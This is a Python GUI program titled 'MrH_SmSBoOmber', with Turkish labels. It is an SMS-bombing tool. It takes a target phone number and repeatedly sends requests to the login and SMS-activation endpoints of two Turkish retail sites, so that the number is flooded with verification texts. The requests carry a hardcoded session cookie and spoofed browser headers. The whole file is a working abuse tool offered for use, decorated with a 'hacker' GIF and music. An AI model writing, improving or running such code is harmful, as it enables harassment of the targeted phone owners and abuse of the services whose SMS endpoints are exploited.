import tkinter as tk
from tkinter import PhotoImage
import requests
import time
from PIL import Image, ImageTk
import pygame
from io import BytesIO

class SendSms:
    sms = 0
    test = 0
    adet = 0

    def __init__(self, telefon_numarasi):
        self.telefon_numarasi = str(telefon_numarasi)

    def bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.telefon_numarasi})
            if bim.status_code == 200:
                print("SMS Gönderildi")
                self.sms += 1
                self.bekle_ve_calistir(5)
            else:
                raise Exception("SMS Gönderilemedi")
        except Exception as e:
            print(f"Hata: {e}")

    def bekle_ve_calistir(self, saniye):
        time.sleep(saniye)
        try:
            if self.sms < 6:
                self.bim()
        except Exception as e:
            print(f"Hata: {e}")

    def mopas(self):
        try:
            cookies = {"JSESSIONID": "6817377124C666AA59F3E6B0678F124C"}
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0", "Accept": "text/plain, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Dnt": "1", "Referer": "https://mopas.com.tr/login", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.telefon_numarasi}&pwd=&checkPwd=", cookies=cookies, headers=headers)
            if r.status_code == 200:
                print("SMS Gönderildi")
                self.adet += 1
                self.bekle_ve_calistir_2(5)
            else:
                raise Exception("SMS Gönderilemedi")
        except Exception as e:
            print(f"Hata: {e}")

    def bekle_ve_calistir_2(self, saniye):
        time.sleep(saniye)
        try:
            if self.adet < 6:
                self.mopas()
        except Exception as e:
            print(f"Hata: {e}")

class Application(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("MrH_SmSBoOmber")
        self.geometry("300x250")  # Yüksekliği artırıldı
        self.configure(bg='black')

        self.gif = Image.open("hacker.gif")
        self.gif = self.gif.resize((300, 200), Image.BICUBIC)
        self.gif = ImageTk.PhotoImage(self.gif)
        self.label_gif = tk.Label(self, image=self.gif, bg='black')
        self.label_gif.image = self.gif
        self.label_gif.pack()

        self.label = tk.Label(self, text="Telefon Numarası:", bg='black', fg='white')
        self.label.pack(pady=10)
        self.label = tk.Label(self, text="(ör:+901234567890),Lütfen 30 sn.bekleyiniz", bg='black', fg='white')
        self.label.pack(pady=5)

        self.entry = tk.Entry(self, width=20, bg='black', fg='white')
        self.entry.pack(pady=10)

        self.button = tk.Button(self, text="SMS Gönder!", command=self.send_sms, bg='black', fg='white')
        self.button.pack(pady=10)

        # Müzik çalma butonu eklenmiştir
        self.play_button = tk.Button(self, text="Müzik Çal", command=self.play_music, bg='black', fg='white')
        self.play_button.pack(pady=10)

        self.scroll_label = tk.Label(self, text="© Copyright MÖ 209-& Mr Hacofic", bg='black', fg='red')
        self.scroll_label.pack(pady=10)

        self.scroll_text()

    def send_sms(self):
        phone_number = self.entry.get()
        sms_sender = SendSms(phone_number)
        sms_sender.bim()
        sms_sender.mopas()

    def play_music(self):
        try:
            music_url = "https://filebin.net/qdoy9thp5bntm9re/Fake_Hacking_with_sound.mp3"
            response = requests.get(music_url)
            music_data = BytesIO(response.content)

            pygame.mixer.init()
            pygame.mixer.music.load(music_data)
            pygame.mixer.music.play()
        except Exception as e:
            print(f"Hata: {e}")

    def scroll_text(self):
        pass

if __name__ == "__main__":
    app = Application()
    app.mainloop()
